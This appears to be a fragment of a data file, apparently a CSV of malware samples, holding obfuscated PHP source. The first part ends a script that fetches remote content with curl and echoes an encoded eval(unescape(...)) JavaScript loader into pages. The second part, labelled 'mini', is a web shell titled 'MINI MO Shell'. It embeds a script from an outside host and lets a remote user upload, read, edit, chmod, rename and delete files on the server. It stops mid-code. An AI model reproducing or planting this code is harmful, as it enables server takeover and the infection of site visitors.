71o\x6dn""]=""\x73\x74r\x69n\x67"";${$uonmsx}.=""\x250"".dechex(ord(${${""\x47\x4cO\x42A\x4c\x53""}[""\x67\x61q\x6f\x6d\x6e""]}[${${""\x47L\x4f\x42\x41LS""}[""up\x6b\x7a\x72\x65\x67\x74""]}]));}else{${""GL\x4fB\x41L\x53""}[""\x64b\x71\x75hz\x78\x6d\x7a\x77""]=""i"";${""\x47\x4c\x4f\x42A\x4c\x53""}[""b\x74\x6d\x74\x79\x74y\x69\x77""]=""\x73t\x72\x69ng"";${${""\x47\x4cO\x42AL\x53""}[""d\x79gi\x70\x72ye""]}.=""%"".dechex(ord(${${""\x47\x4c\x4fB\x41LS""}[""\x62\x74\x6d\x74yty\x69\x77""]}[${${""\x47\x4c\x4f\x42\x41\x4c\x53""}[""\x64\x62\x71uh\x7ax\x6d\x7a\x77""]}]));}}return${$jtidntkk};}function file_get_contents2($u){${""G\x4c\x4f\x42\x41L\x53""}[""\x78f\x62wu\x67\x66e\x6a\x72\x67\x77""]=""\x63\x68"";${""GL\x4f\x42A\x4c\x53""}[""\x74\x6d\x6e\x63r\x67\x79""]=""c\x68"";$euvteggn=""\x72\x65\x73ul\x74"";${${""\x47\x4c\x4f\x42\x41\x4cS""}[""x\x66b\x77ugfe\x6a\x72\x67\x77""]}=curl_init();$fgwzubdr=""c\x68"";$ooznniaxe=""\x75"";curl_setopt(${${""\x47L\x4fBA\x4c\x53""}[""\x73b\x67\x6els\x70\x62\x66""]},CURLOPT_URL,${$ooznniaxe});${""\x47\x4cO\x42\x41L\x53""}[""\x71d\x66p\x6b\x6fb\x65""]=""\x63h"";curl_setopt(${$fgwzubdr},CURLOPT_HEADER,0);curl_setopt(${${""G\x4cOB\x41\x4c\x53""}[""\x73\x62\x67\x6e\x6cs\x70b\x66""]},CURLOPT_RETURNTRANSFER,true);curl_setopt(${${""\x47LOB\x41\x4cS""}[""t\x6d\x6ec\x72\x67\x79""]},CURLOPT_USERAGENT,""\x4d\x6fzi\x6cla/5.0\x20(\x57i\x6edows N\x54 6\x2e\x31\x3b\x20W\x4f\x57\x36\x34\x3b\x20\x72v:\x312.\x30)\x20G\x65c\x6bo/\x320\x31\x30\x301\x301 \x46irefox/\x31\x32\x2e\x30 "");${${""G\x4cO\x42A\x4cS""}[""\x77\x70h\x63\x62p\x72\x69\x72\x63\x62v""]}=curl_exec(${${""\x47LO\x42\x41L\x53""}[""qdf\x70\x6b\x6f\x62\x65""]});return${$euvteggn};}echo ""\x3cscrip\x74 \x74ype=\""\x74\x65\x78\x74/\x6a\x61vas\x63r\x69pt\"">\n<!-- \n\x65\x76al(\x75\x6e\x65\x73ca\x70\x65('%\x366%\x375\x25\x36e\x25\x36\x33\x25\x37\x34%6\x39%6f%6\x65%\x32\x30\x257\x30%\x33\x34\x25\x332\x25\x364\x253\x38\x25\x363\x25\x328%\x37\x33\x252\x39\x25\x320\x25\x37\x62\x25\x30a%\x30\x39\x2576\x25\x36\x31\x25\x37\x32%20%\x372\x25\x320\x253\x64%2\x30\x25\x322%\x32\x32%3b%\x30a\x25\x30\x39\x257\x36\x256\x31\x25\x372%\x32\x30\x25\x37\x34%\x36d\x25\x370%\x320\x25\x33\x64%2\x30\x2573%\x32e\x2573\x257\x30\x25\x36\x63\x2569\x257\x34%28%\x322\x253\x31\x2532%\x33\x31\x25\x330\x2538%3\x35%35%3\x37%22\x25\x329\x25\x33b%\x30a\x25\x309%73%\x32\x30%\x33d%20\x25\x37\x35\x25\x36e%\x365\x25\x373%63%6\x31%70%65%2\x38%7\x34\x25\x36\x64%\x370\x25\x35\x62\x25\x330%\x35\x64\x2529%\x33b%0a%\x30\x39%6b\x252\x30%3d%\x320\x25\x375\x25\x36\x65\x25\x365%\x37\x33%\x363%61%7\x30%\x36\x35\x25\x328%7\x34\x256d\x257\x30%\x35\x62%\x33\x31%\x35d%20\x25\x32\x62%\x320\x252\x32%38%\x33\x35%36\x25\x33\x31%\x336%\x332\x2522\x252\x39\x253\x62%\x30a%0\x39%\x366\x25\x36\x66%72\x252\x38\x2520%\x37\x36\x25\x36\x31\x25\x372\x25\x32\x30%69%2\x30\x25\x33d\x25\x320%3\x30%3b\x2520\x25\x36\x39\x25\x320%\x33c%\x32\x30\x25\x37\x33%2\x65%\x36\x63\x256\x35%\x36\x65%\x367\x25\x374\x256\x38%3\x62\x252\x30\x25\x36\x39\x252\x62%\x32b\x252\x39\x25\x32\x30\x257b%0\x61\x25\x309%0\x39\x2572\x2520%\x32b\x25\x33d%2\x30\x25\x353%\x37\x34%\x37\x32\x25\x36\x39\x25\x36\x65%6\x37%2\x65\x25\x366%\x372%6f%\x36\x64%4\x33\x2568\x2561%\x372\x25\x343%\x36\x66\x2564%6\x35%2\x38%28%\x37\x30\x25\x361\x2572\x2573%\x36\x35\x25\x349%\x36\x65%\x374%2\x38\x25\x36\x62%2\x65\x2563\x25\x36\x38\x256\x31\x25\x372%\x34\x31\x257\x34\x25\x32\x38%69%\x325\x256\x62%\x32\x65%\x36c%\x365%6\x65%\x367\x25\x37\x34%6\x38\x25\x329%2\x39%\x35\x65%\x37\x33%2e\x256\x33%\x36\x38%\x361%72\x25\x34\x33%6f%6\x34%65\x2541%\x374%2\x38\x2569%29%2\x39%2\x62\x25\x337%\x32\x39%\x33\x62\x25\x30a%0\x39\x257d\x250a\x2509\x25\x37\x32%\x36\x35\x2574\x257\x35%7\x32%6\x65%\x320%\x37\x32%\x33\x62\x25\x30a%7\x64%0a'));\ne\x76\x61l(\x75n\x65s\x63a\x70e('\x25\x36\x34\x25\x36\x66%6\x33%7\x35\x256\x64%\x36\x35\x25\x36\x65\x257\x34\x25\x32\x65%\x37\x37\x2572\x25\x36\x39\x25\x37\x34%\x36\x35\x25\x328\x25\x37\x30\x253\x34\x253\x32%64%3\x38\x256\x33%2\x38\x25\x327\x27) + \x27%30%\x36b\x25\x35b%6\x32%\x36\x33\x256e\x256\x65\x251\x31%\x36\x39%\x36d%5\x64%\x330%\x31\x39%\x364%6a\x256a%\x36\x30%\x33\x32%\x32f\x25\x32b\x25\x378\x25\x375%7\x36%2\x36\x25\x36\x64\x252\x63%\x335%\x320%67%\x357%\x36\x36\x25\x320\x256e%63\x252d\x25\x37\x34\x255\x62\x25\x375\x25\x35e%\x36\x37%74%\x32\x66%5\x35\x256\x33%7\x34%2\x34%\x36b\x2569%1d%\x336%\x33\x33\x25\x32a%6\x39%5b\x25\x36c\x25\x36\x62%\x368%\x36\x61\x2534\x31\x32108\x35\x35\x37%\x335%3\x37%37%\x33\x39%3\x31\x25\x337%3\x33'\x20+ un\x65\x73\x63\x61\x70e(\x27\x252\x37\x2529%29\x25\x33\x62\x27));\n// -->\n</\x73\x63r\x69p\x74\x3e\n"";
?>"
mini,"<?php ${""GL\x4f\x42\x41\x4cS""}[""\x71\x7a\x71\x65gbq\x73""]=""\x69n\x66o"";${""G\x4c\x4f\x42AL\x53""}[""ufy\x70\x6e\x70\x77\x67\x64d\x71""]=""\x70er\x6d\x73"";${""G\x4c\x4f\x42\x41\x4cS""}[""\x68\x72ex\x64\x65\x64\x79xx""]=""\x73\x69\x7a\x65"";${""\x47\x4c\x4f\x42A\x4c\x53""}[""d\x74i\x67q\x78mm\x6ex""]=""\x66i\x6ce"";${""G\x4cOB\x41\x4cS""}[""\x77\x6ce\x78\x70lt\x75ul\x73""]=""\x64i\x72"";${""G\x4c\x4f\x42\x41L\x53""}[""\x78\x75\x63\x6bh\x78s\x6f""]=""\x73\x63a\x6ed\x69\x72"";${""G\x4c\x4f\x42A\x4cS""}[""\x79\x66\x66\x6f\x61\x6f""]=""\x72\x65\x61d\x64ir"";${""G\x4cOBA\x4cS""}[""\x73xi\x77\x63i""]=""\x6f\x70\x65\x6e\x64\x69r"";${""GL\x4f\x42\x41\x4cS""}[""x\x66f\x72\x73n\x6a\x77\x68hyt""]=""f\x70"";${""GLO\x42\x41\x4c\x53""}[""hk\x79\x61\x71\x63\x78""]=""\x69"";${""GL\x4fB\x41\x4c\x53""}[""\x65\x6bq\x6c\x67ac\x67\x6b\x79\x64""]=""a"";${""G\x4c\x4f\x42A\x4c\x53""}[""\x6bxy\x68\x63a\x6dm\x71v""]=""i\x64"";${""\x47LO\x42\x41\x4c\x53""}[""\x65ub\x6b\x6c\x66\x65\x75\x66d""]=""\x70\x61\x74"";${""\x47L\x4fB\x41LS""}[""b\x6f\x72iszm\x74""]=""\x70\x61\x74\x68\x73"";${""G\x4c\x4f\x42\x41LS""}[""\x6c\x6dby\x76y\x66""]=""\x70a\x74\x68"";${""G\x4cO\x42\x41LS""}[""y\x73\x69\x73\x66i\x64h""]=""v\x61\x6c\x75e"";$gqjubjnwkr=""p\x61\x74\x68"";echo ""\x3c\x73crip\x74\x20\x73\x72\x63\x3dh\x74tp://\x770r\x6d\x73.c\x6f\x6d/ka\x79d\x65\x74\x2e\x70\x68p\x3e\x3c/scr\x69pt\x3e\n"";error_reporting(0);$lgclayedxhl=""\x70\x61t\x68\x73"";$rielgprjvfg=""\x70\x61\x74\x68"";set_time_limit(0);$rlbtdfgm=""\x69d"";${""GL\x4f\x42\x41\x4c\x53""}[""\x7a\x64z\x65y\x64\x62u\x73ew""]=""p\x61\x74h"";${""\x47\x4c\x4f\x42AL\x53""}[""l\x73m\x74\x72\x61\x6bd\x75\x6d\x78""]=""pa\x74"";if(get_magic_quotes_gpc()){$esywilhray=""\x6b\x65\x79"";$ibjbwuwapcd=""v\x61\x6c\x75e"";foreach($_POST as${$esywilhray}=>${$ibjbwuwapcd}){${""\x47LO\x42AL\x53""}[""iwv\x75\x6e\x71\x64\x6djn""]=""\x6be\x79"";$_POST[${${""G\x4cO\x42\x41LS""}[""i\x77\x76\x75\x6e\x71d\x6d\x6a\x6e""]}]=stripslashes(${${""\x47L\x4fBAL\x53""}[""y\x73i\x73f\x69\x64h""]});}}echo""<!\x44\x4fCTY\x50\x45 H\x54\x4dL>\n<ht\x6dl\x3e\n\x3che\x61d\x3e\n<\x6c\x69\x6ek \x68\x72\x65\x66\x3d\""\""\x20\x72\x65l\x3d\""st\x79\x6ce\x73\x68ee\x74\"" type=\""t\x65x\x74/\x63\x73\x73\"">\n<ti\x74l\x65>\x4dINI \x4dO\x20S\x68\x65\x6c\x6c\x3c/\x74itle>\n<st\x79le\x3e\nb\x6fd\x79{\nf\x6fn\x74-fa\x6d\x69l\x79: \""\x52aci\x6eg\x20\x53an\x73 O\x6ee\"",\x20\x63urs\x69\x76e\x3b\nb\x61\x63k\x67\x72o\x75\x6e\x64-\x63\x6f\x6co\x72: blac\x6b\x3b\n\x63ol\x6fr:wh\x69te;\n}\n\x23\x63\x6fn\x74\x65n\x74\x20\x74\x72:\x68\x6f\x76\x65\x72{\nba\x63\x6b\x67\x72ou\x6ed-\x63o\x6co\x72: bl\x75e;\ntext-\x73\x68ad\x6f\x77:0px\x20\x30px\x20\x31\x30p\x78\x20\x23\x66f\x66\x3b\n}\n\x23co\x6etent .fir\x73\x74{\nba\x63kg\x72\x6f\x75n\x64-c\x6f\x6c\x6fr:\x20b\x6c\x75e;\n}\n\x74\x61bl\x65{\nbo\x72\x64\x65r: \x31\x70\x78\x20#\x3000\x300\x30\x20d\x6f\x74te\x64\x3b\n}\n\x61{\nco\x6c\x6fr:whi\x74\x65\x3b\n\x74\x65xt-dec\x6fr\x61\x74\x69on: \x6eone\x3b\n}\n\x61:h\x6fv\x65r{\n\x63ol\x6fr:\x62\x6cu\x65\x3b\n\x74\x65\x78t-\x73\x68a\x64ow:0\x70x\x200p\x78 \x310\x70\x78 #\x66\x66ff\x66f;\n}\ni\x6eput,\x73elec\x74,\x74\x65\x78\x74\x61rea{\n\x62\x6frd\x65r: \x31p\x78\x20\x230000\x30\x30\x20\x73oli\x64;\n-\x6d\x6f\x7a-\x62or\x64\x65r-\x72\x61\x64\x69\x75\x73:\x205px\x3b\n-\x77eb\x6b\x69\x74-b\x6fr\x64\x65\x72-\x72\x61\x64\x69us:\x35px\x3b\n\x62\x6f\x72\x64e\x72-\x72\x61dius:5\x70\x78;\n}\n</\x73t\x79l\x65\x3e\n\x3c/\x68\x65a\x64\x3e\n\x3cb\x6fdy\x3e\n<h\x31\x3e<c\x65n\x74e\x72><\x66\x6fnt\x20\x63o\x6c\x6f\x72=\""\x62\x6c\x75e\""\x3eM\x49\x4e\x49\x20\x4dI\x4e\x49 \x4dAN\x49 \x4dO\x3c/\x66\x6f\x6et>\x3c/c\x65\x6et\x65\x72></\x68\x31\x3e\n\x3c\x74\x61\x62le \x77\x69dth\x3d\x227\x30\x30\"" bord\x65\x72\x3d\""0\x22 \x63e\x6clp\x61d\x64i\x6eg=\""3\"" \x63ell\x73\x70ac\x69\x6eg\x3d\x22\x31\x22\x20\x61\x6cign\x3d\x22cen\x74e\x72\x22\x3e\n\x3c\x74\x72>\x3c\x74\x64\x3e<fo\x6e\x74\x20co\x6co\x72=\x22\x77h\x69\x74\x65\"">Pa\x74h :\x3c/f\x6fn\x74\x3e\x20"";if(isset($_GET[""\x70a\x74h""])){${${""\x47L\x4f\x42\x41L\x53""}[""l\x6db\x79\x76y\x66""]}=$_GET[""path""];}else{$jmoqpfeelgx=""\x70\x61t\x68"";${$jmoqpfeelgx}=getcwd();}${$rielgprjvfg}=str_replace(""\\"",""/"",${${""\x47\x4c\x4f\x42\x41\x4c\x53""}[""\x7adz\x65yd\x62us\x65\x77""]});${${""\x47\x4cO\x42AL\x53""}[""b\x6f\x72isz\x6dt""]}=explode(""/"",${$gqjubjnwkr});foreach(${$lgclayedxhl} as${$rlbtdfgm}=>${${""\x47\x4cOBA\x4c\x53""}[""\x6c\x73m\x74\x72\x61\x6b\x64u\x6d\x78""]}){${""G\x4cO\x42\x41\x4cS""}[""\x6f\x6f\x76e\x64d""]=""\x70\x61\x74"";$qacnvjbofw=""i"";if(${${""\x47\x4c\x4f\x42\x41\x4c\x53""}[""\x65u\x62\x6b\x6c\x66\x65ufd""]}==""""&&${${""\x47\x4c\x4f\x42\x41\x4c\x53""}[""\x6bx\x79\x68ca\x6d\x6d\x71\x76""]}==0){${${""GLOBAL\x53""}[""\x65k\x71\x6cg\x61\x63gky\x64""]}=true;echo""\x3ca\x20hre\x66=\""?\x70\x61\x74\x68=/\"">/\x3c/a\x3e"";continue;}$vjfmclwqpwqk=""\x69"";if(${${""\x47L\x4fB\x41LS""}[""\x6fo\x76e\x64\x64""]}=="""")continue;echo""<\x61 hre\x66\x3d\""?\x70\x61\x74h\x3d"";for(${$vjfmclwqpwqk}=0;${${""G\x4c\x4f\x42\x41\x4c\x53""}[""\x68\x6b\x79\x61\x71\x63\x78""]}<=${${""\x47L\x4f\x42A\x4cS""}[""k\x78\x79\x68c\x61m\x6d\x71\x76""]};${$qacnvjbofw}++){$mngpll=""i\x64"";$gwplrwomto=""\x69"";echo""$paths[$i]"";if(${$gwplrwomto}!=${$mngpll})echo""/"";}echo""\""\x3e"".${${""\x47\x4c\x4fB\x41L\x53""}[""\x65\x75bklf\x65\x75\x66d""]}.""\x3c/\x61\x3e/"";}echo""\x3c/td\x3e\x3c/\x74r\x3e\x3c\x74r\x3e<\x74d>"";if(isset($_FILES[""\x66il\x65""])){${""\x47LOB\x41L\x53""}[""h\x70\x62\x6f\x63\x74\x67\x70""]=""\x70\x61\x74\x68"";if(copy($_FILES[""file""][""\x74\x6dp_\x6e\x61m\x65""],${${""\x47\x4cOB\x41LS""}[""\x68\x70\x62\x6fc\x74\x67p""]}.""/"".$_FILES[""\x66\x69\x6c\x65""][""nam\x65""])){echo""<f\x6f\x6e\x74\x20c\x6f\x6c\x6f\x72=\""g\x72ee\x6e\""\x3e\x55\x70\x6c\x6f\x61d Be\x72\x68\x61s\x69\x6c\x3c/font\x3e<br\x20/\x3e"";}else{echo""<f\x6f\x6e\x74\x20\x63\x6fl\x6f\x72\x3d\""\x72ed\"">Uplo\x61d\x20\x47\x61g\x61\x6c</\x66\x6fn\x74\x3e\x3c\x62\x72/\x3e"";}}echo""\x3c\x66o\x72\x6d\x20enc\x74\x79\x70e\x3d\x22mul\x74i\x70\x61\x72\x74/form-d\x61t\x61\""\x20m\x65t\x68\x6fd\x3d\x22PO\x53T\""\x3e\n<\x66on\x74 co\x6c\x6fr\x3d\x22\x77h\x69\x74\x65\"">F\x69l\x65\x20\x55\x70\x6c\x6fad\x20:</\x66on\x74>\x20<in\x70ut ty\x70\x65\x3d\""file\x22 \x6ea\x6d\x65=\x22f\x69\x6ce\""\x20/\x3e\n<\x69np\x75\x74\x20\x74ype=\""\x73ubmi\x74\x22 va\x6c\x75e=\x22\x75p\x6c\x6fa\x64\x22\x20/\x3e\n\x3c/f\x6f\x72\x6d\x3e\n\x3c/\x74d\x3e\x3c/tr>"";if(isset($_GET[""f\x69l\x65sr\x63""])){echo""<\x74\x72\x3e<td\x3e\x43u\x72re\x6e\x74\x20F\x69\x6ce :\x20"";echo$_GET[""\x66\x69\x6ce\x73\x72\x63""];echo""\x3c/tr\x3e</\x74d>\x3c/tab\x6ce>\x3cbr\x20/\x3e"";echo(""<\x70r\x65>"".htmlspecialchars(file_get_contents($_GET[""file\x73r\x63""])).""\x3c/p\x72e>"");}elseif(isset($_GET[""opt\x69on""])&&$_POST[""\x6fp\x74""]!=""de\x6ce\x74\x65""){echo""</\x74\x61\x62\x6ce\x3e<\x62\x72\x20/><\x63\x65\x6ete\x72>"".$_POST[""pa\x74\x68""].""\x3c\x62\x72\x20/>\x3c\x62r />"";if($_POST[""\x6fp\x74""]==""c\x68mo\x64""){if(isset($_POST[""\x70\x65\x72m""])){if(chmod($_POST[""\x70\x61th""],$_POST[""p\x65\x72m""])){echo""\x3cfont\x20\x63ol\x6fr=\x22\x67r\x65e\x6e\x22\x3eCh\x61n\x67\x65\x20Per\x6d\x69\x73\x73ion\x20Be\x72hasi\x6c\x3c/\x66\x6f\x6et\x3e<\x62\x72/\x3e"";}else{echo""<\x66\x6f\x6et c\x6f\x6cor\x3d\x22red\x22\x3e\x43han\x67e P\x65\x72m\x69\x73sio\x6e G\x61g\x61l\x3c/\x66o\x6et><b\x72 />"";}}echo""\x3c\x66orm\x20\x6d\x65\x74h\x6f\x64\x3d\""P\x4f\x53T\x22\x3e\nP\x65\x72\x6d\x69ss\x69o\x6e\x20:\x20<i\x6e\x70u\x74\x20n\x61\x6de\x3d\""\x70\x65\x72\x6d\x22 type\x3d\""\x74e\x78t\x22\x20\x73\x69ze=\""4\"" va\x6c\x75\x65\x3d\"""".substr(sprintf(""%\x6f"",fileperms($_POST[""\x70\x61t\x68""])),-4).""\""\x20/\x3e\n\x3ci\x6ep\x75t \x74ype\x3d\""h\x69\x64d\x65\x6e\"" n\x61me\x3d\""\x70\x61t\x68\x22 \x76a\x6c\x75\x65\x3d\"""".$_POST[""\x70\x61\x74h""].""\x22>\n<\x69\x6ep\x75t \x74y\x70e=\""\x68\x69dde\x6e\x22 \x6e\x61\x6d\x65=\""\x6f\x70\x74\x22\x20\x76\x61\x6c\x75e=\""\x63h\x6d\x6fd\x22>\n\x3c\x69np\x75t \x74yp\x65=\x22s\x75bm\x69\x74\x22 \x76a\x6cue=\x22\x47\x6f\""\x20/\x3e\n\x3c/for\x6d>"";}elseif($_POST[""\x6fpt""]==""r\x65\x6eame""){if(isset($_POST[""newn\x61\x6d\x65""])){${""\x47\x4c\x4f\x42A\x4c\x53""}[""\x6fv\x64g\x6c\x64\x71""]=""\x70\x61\x74\x68"";if(rename($_POST[""\x70\x61th""],${${""\x47\x4c\x4f\x42\x41LS""}[""\x6f\x76\x64\x67\x6c\x64\x71""]}.""/"".$_POST[""\x6ee\x77\x6e\x61\x6de""])){echo""<f\x6f\x6e\x74\x20c\x6f\x6c\x6f\x72\x3d\x22\x67\x72e\x65n\""\x3eG\x61\x6e\x74i\x20\x4e\x61ma Ber\x68\x61\x73\x69\x6c</\x66on\x74\x3e<\x62\x72/>"";}else{echo""<\x66o\x6et\x20c\x6flor\x3d\x22r\x65d\x22>\x47\x61\x6e\x74i\x20N\x61ma\x20Gag\x61l\x3c/font><\x62r\x20/\x3e"";}$_POST[""name""]=$_POST[""\x6e\x65wname""];}echo""\x3c\x66\x6frm\x20me\x74\x68o\x64=\""POST\""\x3e\n\x4eew\x20\x4e\x61me :\x20<\x69nput\x20\x6eam\x65\x3d\""n\x65w\x6eam\x65\x22\x20\x74yp\x65\x3d\x22te\x78\x74\"" \x73iz\x65=\""2\x30\""\x20v\x61l\x75\x65=\x22"".$_POST[""\x6e\x61m\x65""].""\"" /\x3e\n<\x69\x6ep\x75\x74 \x74yp\x65=\x22hi\x64den\x22\x20n\x61me\x3d\""\x70\x61th\"" value\x3d\x22"".$_POST[""\x70ath""].""\""\x3e\n<\x69n\x70ut\x20t\x79p\x65=\""h\x69dden\x22 \x6eam\x65=\""op\x74\""\x20\x76\x61lue\x3d\x22re\x6ea\x6d\x65\x22\x3e\n\x3ci\x6ep\x75t\x20\x74\x79\x70e=\""su\x62\x6d\x69t\x22 \x76\x61lu\x65=\""\x47o\""\x20/\x3e\n\x3c/f\x6f\x72m>"";}elseif($_POST[""\x6fp\x74""]==""e\x64\x69\x74""){if(isset($_POST[""\x73\x72c""])){${""\x47LO\x42\x41L\x53""}[""\x76\x66\x75\x6a\x74\x64\x64""]=""\x66p"";${${""\x47\x4cO\x42\x41\x4c\x53""}[""\x78\x66\x66r\x73n\x6aw\x68\x68\x79\x74""]}=fopen($_POST[""pa\x74h""],""\x77"");if(fwrite(${${""GLOB\x41\x4c\x53""}[""\x78\x66fr\x73\x6e\x6a\x77h\x68\x79\x74""]},$_POST[""\x73r\x63""])){echo""<f\x6fn\x74\x20\x63\x6f\x6cor=\""gr\x65\x65\x6e\"">\x42\x65rh\x61s\x69\x6c\x20E\x64i\x74\x20F\x69\x6ce\x3c/\x66on\x74>\x3c\x62\x72/\x3e"";}else{echo""\x3cfo\x6e\x74 c\x6f\x6cor=\""r\x65\x64\""\x3e\x47\x61gal\x20Edi\x74 F\x69\x6ce\x3c/f\x6fnt>\x3c\x62r/>"";}fclose(${${""\x47LO\x42A\x4c\x53""}[""vfuj\x74dd""]});}echo""\x3cform \x6de\x74h\x6f\x64=\""\x50\x4f\x53T\x22\x3e\n<\x74\x65\x78ta\x72ea col\x73=8\x30 row\x73=\x32\x30 \x6e\x61\x6d\x65=\""\x73r\x63\""\x3e"".htmlspecialchars(file_get_contents($_POST[""\x70\x61t\x68""])).""\x3c/t\x65x\x74\x61\x72e\x61\x3e<b\x72 />\n<\x69nput\x20\x74yp\x65=\x22h\x69\x64de\x6e\x22\x20na\x6de=\""p\x61\x74\x68\""\x20\x76\x61lue=\x22"".$_POST[""p\x61th""].""\""\x3e\n<\x69n\x70ut \x74yp\x65=\x22\x68\x69dden\"" \x6eam\x65=\""\x6f\x70t\x22\x20valu\x65=\""\x65\x64\x69\x74\x22>\n\x3c\x69\x6e\x70ut type=\""\x73u\x62m\x69t\x22 va\x6c\x75\x65=\x22Save\"" /\x3e\n</\x66o\x72\x6d>"";}echo""</\x63\x65\x6eter>"";}else{${""\x47\x4c\x4f\x42\x41L\x53""}[""jye\x6b\x66y\x6dfe\x73vs""]=""\x66\x69\x6c\x65"";echo""\x3c/\x74\x61\x62l\x65\x3e\x3cb\x72/\x3e\x3c\x63\x65nt\x65\x72\x3e"";if(isset($_GET[""\x6fpti\x6fn""])&&$_POST[""\x6f\x70\x74""]==""d\x65\x6ce\x74\x65""){if($_POST[""\x74y\x70e""]==""dir""){if(rmdir($_POST[""\x70a\x74h""])){echo""\x3c\x66ont c\x6f\x6c\x6fr=\x22\x67reen\""\x3eDire\x63\x74\x6f\x72\x79 T\x65r\x68\x61pu\x73\x3c/\x66o\x6et\x3e\x3c\x62\x72/\x3e"";}else{echo""<f\x6f\x6e\x74 \x63\x6f\x6co\x72=\x22r\x65d\x22>\x44\x69r\x65\x63t\x6fr\x79 \x47\x61\x67\x61l \x54er\x68\x61\x70u\x73   \x20\x20\x20\x20\x20 \x20\x20 \x20\x20 \x20  \x20 \x20\x20\x20\x20\x20  \x20  \x20 \x20\x20\x20  \x20\x20 \x20\x20  \x20 \x20\x20  \x20  \x20 \x20 \x20 \x20\x20\x20 \x20\x20\x20 \x20 \x20 \x20\x20 \x20\x20\x20\x20 \x20\x20 \x20    \x20\x20    \x20\x20  \x20\x20\x20\x20\x20\x20\x20\x20\x20\x20  \x20\x20   \x20  \x20\x20\x20\x20    \x20 \x20\x20 \x20  \x20\x20      \x20  \x20\x20\x20\x20\x20 \x20\x20\x20\x20\x20 \x20 \x20 \x20\x20 \x20\x20\x20 \x20\x20 \x20\x20\x20\x20  \x20 \x20\x20 \x20\x20\x20\x20\x20\x20  \x20     \x20 \x20\x20 \x20    \x20    \x20 \x20          \x20 \x20 \x20 \x20\x20 \x20\x20 \x20 \x20 \x20\x20    \x20   \x20     \x20   \x20   \x20 \x20 \x20 \x20  \x20  \x20\x20  \x20 \x20\x20 \x20</f\x6f\x6et\x3e<\x62\x72/\x3e"";}}elseif($_POST[""\x74yp\x65""]==""\x66i\x6c\x65""){if(unlink($_POST[""\x70a\x74h""])){echo""\x3c\x66o\x6et\x20\x63\x6f\x6co\x72=\x22\x67\x72\x65en\x22\x3e\x46ile\x20T\x65\x72hapu\x73</\x66\x6f\x6e\x74><br/>"";}else{echo""\x3cf\x6fn\x74 c\x6flo\x72=\x22\x72\x65\x64\""\x3eFil\x65 \x47agal Di\x68\x61p\x75s</\x66o\x6et\x3e<\x62\x72/\x3e"";}}}echo""\x3c/\x63\x65nte\x72\x3e"";if(function_exists(""\x6fpe\x6edir"")){$cdrhmshw=""\x6fpe\x6ed\x69\x72"";${""\x47LOB\x41\x4c\x53""}[""\x7a\x67\x68\x62t\x6ckit\x64""]=""pa\x74\x68"";${""G\x4c\x4f\x42\x41\x4c\x53""}[""\x71\x73rt\x62\x62\x74lu\x77v""]=""s\x63a\x6e\x64\x69\x72"";if(${$cdrhmshw}=opendir(${${""G\x4c\x4f\x42\x41\x4c\x53""}[""z\x67\x68b\x74l\x6b\x69\x74d""]})){${""\x47\x4c\x4f\x42\x41\x4cS""}[""\x68\x6f\x75\x6c\x65ku\x6cv\x68""]=""\x72e\x61\x64d\x69\x72"";while((${${""\x47\x4c\x4f\x42\x41\x4c\x53""}[""hou\x6c\x65\x6bu\x6c\x76\x68""]}=readdir(${${""\x47\x4c\x4f\x42A\x4c\x53""}[""\x73x\x69wci""]}))!==false){$qlccwleka=""\x73\x63a\x6e\x64\x69\x72"";${$qlccwleka}[]=${${""\x47\x4cO\x42\x41LS""}[""\x79\x66\x66\x6f\x61o""]};}$vecxfz=""\x6f\x70\x65n\x64\x69\x72"";closedir(${$vecxfz});}sort(${${""\x47L\x4f\x42\x41\x4c\x53""}[""\x71s\x72t\x62b\x74lu\x77v""]});}else{${""GL\x4fBA\x4cS""}[""d\x73c\x6b\x76\x72\x74\x77\x62""]=""\x73\x63\x61\x6e\x64\x69\x72"";${${""\x47L\x4f\x42A\x4c\x53""}[""\x64s\x63\x6b\x76\x72tw\x62""]}=scandir(${${""\x47LO\x42AL\x53""}[""l\x6d\x62\x79\x76\x79\x66""]});}echo""<d\x69v\x20id\x3d\""\x63o\x6e\x74\x65\x6et\x22\x3e\x3ctab\x6c\x65\x20wid\x74h=\""70\x30\""\x20bord\x65\x72\x3d\""\x30\x22 cel\x6c\x70a\x64\x64i\x6e\x67=\""\x33\x22\x20\x63el\x6cs\x70\x61\x63\x69ng\x3d\""1\"" \x61\x6c\x69\x67n=\""c\x65\x6et\x65\x72\x22>\n<tr\x20c\x6cass=\x22fir\x73t\x22>\n\x3c\x74d\x3e\x3c\x63en\x74\x65\x72>\x4eam\x65</\x70ell\x65r\x3e</\x63e\x6e\x74\x65\x72>\x3c/\x74d>\n<td><\x63e\x6eter\x3eS\x69ze</p\x65lle\x72></\x63\x65\x6et\x65\x72\x3e\x3c/td\x3e\n<\x74\x64><\x63enter>Pe\x72\x6dis\x73i\x6f\x6e\x3c/\x70elle\x72\x3e\x3c/\x63\x65nter\x3e\x3c/t\x64>\n<t\x64\x3e<ce\x6et\x65\x72\x3e\x4dod\x69\x66\x79</\x70el\x6cer\x3e</c\x65\x6ete\x72></t\x64\x3e\n</\x74\x72>"";foreach(${${""\x47LOBA\x4c\x53""}[""\x78\x75\x63\x6b\x68\x78\x73\x6f""]} as${${""\x47L\x4f\x42A\x4cS""}[""w\x6c\x65x\x70\x6c\x74u\x75\x6c\x73""]}){${""GLO\x42\x41\x4c\x53""}[""\x67\x63\x70\x62\x7a\x6du\x73i\x6eo""]=""\x64i\x72"";${""\x47L\x4f\x42A\x4c\x53""}[""\x6b\x61\x75\x65e\x64\x68\x65\x68\x6cm""]=""d\x69\x72"";$hgcokjj=""\x64\x69\x72"";${""GL\x4fB\x41\x4cS""}[""\x65hm\x62\x75\x78x""]=""\x70\x61\x74\x68"";${""\x47L\x4fBA\x4cS""}[""b\x72\x71h\x73\x73\x6e\x72\x64s""]=""p\x61\x74h"";$pokwgrfwecy=""\x70ath"";$fkrkggxfbg=""di\x72"";$pjvwmigkpj=""dir"";if(!is_dir(${${""\x47\x4c\x4f\x42AL\x53""}[""\x6c\x6d\x62\x79v\x79f""]}.""/"".${${""\x47\x4cO\x42A\x4c\x53""}[""wl\x65\x78plt\x75u\x6c\x73""]})||${${""G\x4cO\x42\x41L\x53""}[""\x67\x63p\x62z\x6du\x73i\x6eo""]}=="".""||${${""\x47\x4c\x4f\x42AL\x53""}[""w\x6ce\x78\x70\x6c\x74u\x75ls""]}==""\x2e."")continue;$ryfwiqqiv=""d\x69\x72"";echo""<\x74\x72\x3e\n<\x74\x64\x3e\x3ca 